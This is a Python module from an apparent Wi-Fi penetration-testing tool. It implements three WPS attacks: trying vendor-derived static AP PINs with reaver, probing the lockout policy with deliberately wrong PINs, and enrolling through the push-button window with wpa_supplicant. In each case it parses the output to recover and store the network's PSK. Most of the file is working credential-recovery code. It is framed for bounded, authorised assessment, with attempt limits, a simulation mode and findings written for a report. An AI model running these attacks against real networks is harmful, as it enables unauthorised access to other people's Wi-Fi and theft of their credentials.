"""Three more WPS attacks: the AP PIN, the lockout policy, and push-button enrolment.

``wps.py`` has the two attacks everybody knows — Pixie-Dust and the online PIN walk.
This module adds the three questions those two leave open:

* ``wps_ap_pin`` — try the vendor's *static AP PIN* candidates.  The AP PIN is the
  registrar's own credential, it is derived from the BSSID by an algorithm several
  vendors shipped, and on those devices it does not change when the owner resets the
  WPS PIN.  One attempt, from a short list, and the report says which source the
  candidate came from.
* ``wps_lockout_probe`` — send a few deliberately wrong PINs and *stop*: the finding is
  whether the AP locks WPS out (and for how long), because that is what decides whether
  an online attack is worth running at all.  Three attempts, not three thousand.
* ``wps_pbc`` — push-button enrolment: inside the window the owner opened, an attacker
  in radio range can enrol as a registrar.  This one uses ``wpa_supplicant``'s own
  ``wps_pbc`` method, which is exactly what a phone would do, and harvests the
  credential from the supplicant afterwards.

All three are honest about the difference between "the AP refused" and "the AP was
never in a state where it could have said yes".
"""

from __future__ import annotations

import contextlib
import os
import re
import time
from typing import List, Optional, Tuple

from ..deps import registry
from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Finding
from ..util import Process, human_duration
from .base import Attack, AttackContext, AttackOutcome
from .wps import candidate_pins


class _WpsProbeAttack(Attack):
    """Shared plumbing for the WPS attacks that run one bounded tool invocation."""

    requires = ("wps",)
    needs_injection = True
    category = "wps"
    noise = "quiet"
    impact = "loot"
    applies_to = ("WPA", "WPA2", "WPA2/WPA3", "WPA3")
    applies_must_have_wps = True
    #: the target as the progress line should name it (set per attempt)
    _current = ""
    warning = ""
    finding_title = ""
    finding_severity = "medium"
    finding_detail = ""

    def applies(self, ap: AccessPoint) -> bool:
        return bool(ap.wps) if self.applies_must_have_wps else True

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        return bool(registry.path("reaver") or registry.path("bully"))

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return "needs reaver or bully for the WPS exchange"

    # ---------------------------------------------------------------- #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if not self.applies(ap):
            ctx.session.end_attempt(attempt, "skipped", "no WPS on this AP")
            return AttackOutcome.skipped("no WPS on this AP",
                                         f"{ap.display_name} does not advertise WPS")
        if ap.wps_locked:
            # the flag comes from a scan that may be hours old, and the lockout may
            # have expired: say so and try, the way wps_pixie does
            ctx.bus.log(f"{ap.display_name}: WPS flagged locked ({ap.wps_locked}); "
                        f"trying anyway — the flag is only as fresh as the last scan",
                        level="warning")
        with contextlib.suppress(Exception):
            ctx.set_channel(ap.channel)
        ctx.bus.log(f"{self.label} on {ap.display_name}: {self.warning}", level="info")
        if ctx.demo:
            return self._demo(ctx, ap, attempt)
        return self._live(ctx, ap, attempt)

    # ---------------------------------------------------------------- #
    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                result: str, detail: str, severity: str, title: str, body: str,
                extra: dict, simulated: bool) -> AttackOutcome:
        if simulated:
            detail += " (simulated)"
        ctx.session.add_finding(Finding(kind=self.name, severity=severity,
                                        bssid=ap.bssid, title=title, detail=body))
        ap.remember(self.name, detail, simulated=simulated)
        ctx.session.stats.wps_probes += 1
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, result, detail)
        return AttackOutcome.success(result, detail=detail,
                                     extra={**extra, "simulated": simulated})

    # ---------------------------------------------------------------- #
    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt
              ) -> AttackOutcome:
        started = time.time()
        for step in range(1, 4):
            ctx.progress(f"{self.label} on {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=step * 30,
                         detail="WPS exchange · simulation")
            time.sleep(0.25)
        return self._demo_result(ctx, ap, attempt, time.time() - started)

    def _demo_result(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                     seconds: float) -> AttackOutcome:
        raise NotImplementedError

    # ---------------------------------------------------------------- #
    def _run_tool(self, ctx: AttackContext, args: List[str], timeout: float,
                  needle: Optional[str] = None) -> Tuple[Process, List[str], bool]:
        """Start a tool, watch its output, stop it on the first match or on time."""
        proc = Process(args, name=os.path.basename(args[0]),
                       echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return proc, [], False
        started = time.time()
        matched = False
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(0.5)
                ctx.progress(f"{self.label} on {self._target_name}", kind="capture",
                             percent=min(95, (time.time() - started) / timeout * 100),
                             detail="reading the WPS exchange")
                if needle and any(needle in line for line in proc.lines[-80:]):
                    matched = True
                    break
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
        return proc, list(proc.lines), matched

    def _target_name(self) -> str:
        return "target"

    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt
              ) -> AttackOutcome:
        raise NotImplementedError


class WpsApPinAttack(_WpsProbeAttack):
    name = "wps_ap_pin"
    label = "WPS AP-PIN attempt (vendor algorithm)"
    tool = "reaver -p <AP PIN> (or bully)"
    description = ("Try the static AP-PIN candidates that vendor algorithms derive from "
                   "the BSSID.  The AP PIN is the registrar's own credential: on the "
                   "devices that shipped a generated one it never changes, so a single "
                   "correct candidate hands over the PSK no matter how many times the "
                   "owner has reset the WPS PIN.  One attempt per candidate, then stop.")
    impact = "loot"
    warning = ("AP-PIN candidates from a vendor algorithm are tried against the "
               "registrar interface; a wrong candidate is a logged WPS failure")
    finding_title = "Static AP PIN accepted (vendor-derived credential)"
    finding_severity = "critical"
    finding_detail = ("the AP's own registrar PIN was one of the vendor-derived "
                      "candidates and the exchange completed, so the network's PSK was "
                      "recovered without any interaction with the owner.  The PIN is "
                      "derived from the BSSID, which is broadcast to the world.")
    #: never try more than this many candidates, whatever the vendor algorithm says
    max_candidates = 3

    def _target_name(self) -> str:
        return self._current

    def candidates(self, ap: AccessPoint) -> List[Tuple[str, str]]:
        pins = [(pin, source) for pin, source in candidate_pins(ap)
                if "pin" in source.lower() or "ap" in source.lower() or not source]
        return pins[:self.max_candidates] or list(candidate_pins(ap))[:self.max_candidates]

    def _demo_result(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                     seconds: float) -> AttackOutcome:
        pins = self.candidates(ap)
        # half the simulated vendors are vulnerable, half are not: the report has to
        # handle both, and the demo should exercise both branches
        vulnerable = bool(pins) and int(ap.bssid.replace(":", ""), 16) % 2 == 1
        if vulnerable:
            pin, source = pins[0]
            demo_ap = ctx.radio.find(ap.bssid) if ctx.radio else None
            password = (demo_ap.psk if demo_ap else "") or "wifipilot-demo"
            ctx.session.add_capture(_credential_capture(ctx, ap, password,
                                                        "wps-ap-pin"))
            ctx.session.stats.wps_cracks += 1
            ctx.session.stats.passwords += 1
            return self._finish(
                ctx, ap, attempt, "AP PIN accepted",
                f"candidate {pin} ({source or 'vendor algorithm'}) was accepted after "
                f"{seconds:.1f}s; PSK recovered",
                "critical", self.finding_title,
                f"{self.finding_detail}  Candidate source: {source or 'vendor algorithm'}"
                f".  The PSK is in the session's credential store, not in this line.",
                {"pin": pin, "pin_source": source, "password_recovered": True,
                 "candidates_tried": pins}, True)
        return self._finish(
            ctx, ap, attempt, "AP PIN refused",
            f"{len(pins)} vendor candidate(s) rejected; the registrar PIN is not "
            f"derived from this BSSID",
            "low", "Vendor-derived AP PINs rejected (registrar PIN is unique)",
            ("the AP refused every candidate from the vendor algorithm, so its "
             "registrar PIN is unique to the device — the hardware-specific case.  "
             "WPS should still be switched off: a unique PIN is only as strong as its "
             "lockout policy."),
            {"pin": "", "pin_source": "", "password_recovered": False,
             "candidates_tried": pins}, True)

    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt
              ) -> AttackOutcome:
        reaver = registry.path("reaver")
        if not reaver:
            return self._fail(ctx, attempt, "reaver missing",
                              "bully has no equivalent single-shot AP-PIN mode that "
                              "reports the PSK: install reaver")
        pins = self.candidates(ap)
        if not pins:
            return self._fail(ctx, attempt, "no AP-PIN candidates",
                              "no vendor algorithm in this build produces a candidate "
                              "for this BSSID (see `wifipilot toolbox`)")
        tried: List[str] = []
        timeout = min(ctx.config.attack_timeout_for(self.name), 90.0) / max(1, len(pins))
        for pin, source in pins:
            if ctx.want_stop():
                break
            self._current = f"{ap.display_name} pin {pin}"
            tried.append(pin)
            args = [reaver, "-i", ctx.monitor, "-b", ap.bssid,
                    "-c", str(ap.channel or 1), "-p", pin, "--no-nacks", "-vv"]
            proc, lines, matched = self._run_tool(
                ctx, args, timeout, needle="WPA PSK")
            blob = "\n".join(lines)
            found = re.search(r"WPA PSK:\s*'([^']*)'", blob)
            if found or matched:
                password = found.group(1) if found else ""
                ctx.session.add_capture(_credential_capture(ctx, ap, password,
                                                            "wps-ap-pin"))
                ctx.session.stats.wps_cracks += 1
                ctx.session.stats.passwords += 1
                return self._finish(
                    ctx, ap, attempt, "AP PIN accepted",
                    f"candidate {pin} ({source}) was accepted; PSK recovered",
                    "critical", self.finding_title,
                    f"{self.finding_detail}  Candidate source: {source}.",
                    {"pin": pin, "pin_source": source, "password_recovered": True,
                     "candidates_tried": tried}, False)
            if "WPS PIN" in blob and "locked" in blob.lower():
                ap.wps_locked = "locked during AP-PIN attempt"
                break
        return self._finish(
            ctx, ap, attempt, "AP PIN refused",
            f"{len(tried)} vendor candidate(s) rejected",
            "low", "Vendor-derived AP PINs rejected (registrar PIN is unique)",
            ("every candidate from the vendor algorithm was refused, so the registrar "
             "PIN is unique to this device.  Switch WPS off anyway: a unique PIN is "
             "only as strong as the lockout policy, and `wps_lockout_probe` measures "
             "that."),
            {"pin": "", "pin_source": "", "password_recovered": False,
             "candidates_tried": tried}, False)


class WpsLockoutProbeAttack(_WpsProbeAttack):
    name = "wps_lockout_probe"
    label = "WPS lockout probe (policy measurement)"
    tool = "reaver (wrong PINs, then stop) / wash"
    description = ("Send three deliberately wrong PINs and read the AP's answer: does it "
                   "lock WPS, after how many failures, and for how long?  That single "
                   "fact decides whether an online PIN walk is worth hours of radio "
                   "time.  The attack stops after three attempts on purpose — measuring "
                   "a lockout means triggering it, not defeating it.")
    noise = "quiet"
    impact = "info"
    warning = ("three wrong WPS PINs are sent; they may lock WPS on the AP until it is "
               "rebooted, which the report will state as the finding")
    finding_title = "WPS has no lockout: an online PIN walk is viable"
    finding_severity = "high"
    finding_detail = ("the AP answered three wrong PINs with no lockout, so it can be "
                      "walked one PIN at a time.  With the Wi-Fi Alliance's PIN "
                      "generation, an attacker who knows part of the PIN needs a small "
                      "number of attempts — the countermeasure that is supposed to stop "
                      "this is the lockout, and it is not enforced.")
    #: how many wrong pins we are willing to send: three is a measurement, not an attack
    attempts = 3

    def _target_name(self) -> str:
        return self._current

    def _demo_result(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                     seconds: float) -> AttackOutcome:
        locked = int(ap.bssid.replace(":", ""), 16) % 2 == 1
        if locked:
            return self._finish(
                ctx, ap, attempt, "WPS locks out",
                f"lockout after {self.attempts} wrong PINs (simulated): an online walk "
                f"is not viable here",
                "low", "WPS locks out after repeated failures",
                ("the AP refused further WPS attempts after three wrong PINs, so an "
                 "online PIN walk is not practical — the remaining risk is Pixie-Dust, "
                 "which the `wps_pixie` attack tests offline."),
                {"locked": True, "attempts": self.attempts,
                 "lockout_after": self.attempts}, True)
        ctx.session.stats.wps_lockouts_missing += 1
        return self._finish(
            ctx, ap, attempt, "no lockout",
            f"{self.attempts} wrong PINs accepted with no lockout (simulated)",
            "high", self.finding_title,
            self.finding_detail,
            {"locked": False, "attempts": self.attempts, "lockout_after": 0}, True)

    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt
              ) -> AttackOutcome:
        reaver = registry.path("reaver")
        if not reaver:
            return self._fail(ctx, attempt, "reaver missing",
                              "the lockout policy can be measured with `wash` alone "
                              "only passively: install reaver to send the wrong PINs")
        wrong = ["00000000", "11111111", "99999999"][:self.attempts]
        timeout = min(ctx.config.attack_timeout_for(self.name), 90.0) / len(wrong)
        observed: List[str] = []
        for index, pin in enumerate(wrong):
            if ctx.want_stop():
                break
            self._current = f"{ap.display_name} wrong PIN {index + 1}/{len(wrong)}"
            args = [reaver, "-i", ctx.monitor, "-b", ap.bssid,
                    "-c", str(ap.channel or 1), "-p", pin, "--no-nacks", "-vv"]
            proc, lines, _matched = self._run_tool(ctx, args, timeout)
            blob = "\n".join(lines).lower()
            if "locked" in blob or "rate limit" in blob or "detected ap rate limiting" in blob:
                observed.append("locked")
                break
            if "pin" in blob:
                observed.append("answered")
        if "locked" in observed:
            return self._finish(
                ctx, ap, attempt, "WPS locks out",
                f"lockout after {len(observed)} wrong PIN(s)",
                "low", "WPS locks out after repeated failures",
                ("the AP refused further attempts after the wrong PINs above, so the "
                 "online walk is not practical: the remaining exposure is Pixie-Dust "
                 "(`wps_pixie`) against the same registrar."),
                {"locked": True, "attempts": len(observed)}, False)
        if observed:
            return self._finish(
                ctx, ap, attempt, "no lockout observed",
                f"{len(observed)} wrong PIN(s) answered without a lockout",
                "high", self.finding_title, self.finding_detail,
                {"locked": False, "attempts": len(observed)}, False)
        return self._fail(ctx, attempt, "no WPS answer at all",
                          "the AP did not complete a WPS exchange in the window: WPS "
                          "may have been disabled since the scan, or the AP is out of "
                          "range")


class WpsPbcAttack(_WpsProbeAttack):
    name = "wps_pbc"
    label = "WPS push-button enrolment (window check)"
    tool = "wpa_supplicant (wps_pbc) + wpa_cli"
    description = ("Walk up to the AP as if pressing its WPS button: enrol with "
                   "wpa_supplicant's own push-button method and read the credential it "
                   "is handed.  Outside the owner-opened window this fails visibly — "
                   "which is the finding an assessment wants, because the window is "
                   "60-120 seconds wide and anything with radio range can use it.")
    noise = "quiet"
    impact = "loot"
    warning = ("the AP is asked to enrol a new registrar as if the WPS button had been "
               "pressed; if somebody presses it, this device joins the network")
    finding_title = "Push-button enrolment accepted an unauthorised registrar"
    finding_severity = "critical"
    finding_detail = ("the AP accepted a push-button enrolment and handed over the "
                      "credential.  The WPS button cannot tell an owner's finger from "
                      "an attacker's frame, so during the window the network is open to "
                      "anyone in range — and many APs reopen the window whenever WPS is "
                      "used at all.")
    #: how long we are willing to sit in the window (seconds)
    window_wait = 60.0

    @staticmethod
    def _config_path(ctx: AttackContext, ap: AccessPoint) -> str:
        return ctx.artifact_path("wps-pbc", ap, ".conf")

    @staticmethod
    def _socket_path(ctx: AttackContext, ap: AccessPoint) -> str:
        return ctx.artifact_path("wps-pbc", ap, ".sock")

    def _demo_result(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                     seconds: float) -> AttackOutcome:
        open_window = int(ap.bssid.replace(":", ""), 16) % 2 == 1
        if open_window:
            demo_ap = ctx.radio.find(ap.bssid) if ctx.radio else None
            password = (demo_ap.psk if demo_ap else "") or "wifipilot-demo"
            ctx.session.add_capture(_credential_capture(ctx, ap, password, "wps-pbc"))
            ctx.session.stats.wps_cracks += 1
            ctx.session.stats.passwords += 1
            return self._finish(
                ctx, ap, attempt, "PBC enrolment succeeded",
                f"the AP enrolled this device and handed over the PSK in {seconds:.0f}s "
                f"(simulated)",
                "critical", self.finding_title,
                f"{self.finding_detail}  The PSK is in the credential store.",
                {"enrolled": True, "password_recovered": True}, True)
        return self._finish(
            ctx, ap, attempt, "no PBC window open",
            f"no push-button window during {self.window_wait:.0f}s of trying "
            f"(simulated)",
            "low", "No push-button window during the attempt",
            ("the AP did not enrol the device, so no window happened to be open while "
             "we were in range.  That is a timing result, not a control: the window "
             "opens whenever somebody presses the button or runs WPS setup, and it "
             "lasts about two minutes."),
            {"enrolled": False, "password_recovered": False}, True)

    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt
              ) -> AttackOutcome:
        supplicant = registry.path("wpa_supplicant")
        cli = registry.path("wpa_cli")
        if not supplicant or not cli:
            return self._fail(
                ctx, attempt, "wpa_supplicant/wpa_cli missing",
                "push-button enrolment is the supplicant's own method: install "
                "wpasupplicant (and note that this attack needs a managed interface, "
                "not a monitor one — turn the monitor interface down first)")
        config = self._config_path(ctx, ap)
        socket_path = self._socket_path(ctx, ap)
        with open(config, "w", encoding="utf-8") as handle:
            handle.write("ctrl_interface=" + socket_path + "\n"
                         "update_config=1\ncountry=00\n")
        iface = ctx.config.interface or ""
        if not iface:
            return self._fail(ctx, attempt, "no managed interface configured",
                              "set `interface` in the config: PBC needs a station "
                              "interface, and wifipilot only knows the monitor one")
        args = [supplicant, "-i", iface, "-c", config, "-B"]
        proc = Process(args, name="wpa_supplicant", echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, "could not start wpa_supplicant", proc.error)
        try:
            time.sleep(2.0)
            pbc = Process([cli, "-i", iface, "wps_pbc"], name="wpa_cli",
                          echo_lines=ctx.config.verbose_tools)
            pbc.start()
            pbc.wait(timeout=15)
            started = time.time()
            status = ""
            while not ctx.want_stop() and time.time() - started < self.window_wait:
                time.sleep(2.0)
                ctx.progress(f"{self.label} on {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started)
                                         / self.window_wait * 100),
                             detail="waiting for the push-button window")
                getter = Process([cli, "-i", iface, "status"], name="wpa_cli",
                                 echo_lines=False)
                getter.start()
                getter.wait(timeout=10)
                status = "\n".join(getter.lines)
                if "wpa_state=COMPLETED" in status:
                    break
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
        if "wpa_state=COMPLETED" not in status:
            return self._finish(
                ctx, ap, attempt, "no PBC window open",
                f"no push-button window during {self.window_wait:.0f}s",
                "low", "No push-button window during the attempt",
                ("the supplicant never completed PBC, so no window was open while we "
                 "were in range.  Retry while somebody is pressing the button — that "
                 "is what the test is for."),
                {"enrolled": False, "password_recovered": False}, False)
        password = ""
        match = re.search(r"^psk=(\S+)$", status, re.M)
        if match:
            password = match.group(1)
        ctx.session.add_capture(_credential_capture(ctx, ap, password, "wps-pbc"))
        ctx.session.stats.wps_cracks += 1
        ctx.session.stats.passwords += 1
        return self._finish(
            ctx, ap, attempt, "PBC enrolment succeeded",
            "the AP enrolled this device through push-button mode and handed over the "
            "credential",
            "critical", self.finding_title,
            f"{self.finding_detail}  The PSK is in the credential store, not in this "
            f"report.",
            {"enrolled": True, "password_recovered": bool(password)}, False)


def _credential_capture(ctx: AttackContext, ap: AccessPoint, password: str, tool: str):
    """Record a recovered credential the way every other attack records one.

    Kind ``"handshake"`` with a ``password`` and ``crack_tool="wps"`` is the session's
    credential convention: the report renders it, the loot path knows where it goes,
    and nothing about it reaches the log (see ``docs/ETHICS-AND-LEGAL.md``).
    """
    from ..models import Capture

    return Capture(kind="handshake", bssid=ap.bssid, essid=ap.essid, path="",
                   valid=True, tool=tool, password=password, crack_tool="wps",
                   extra={"simulated": ctx.demo, "credential": "wps"})
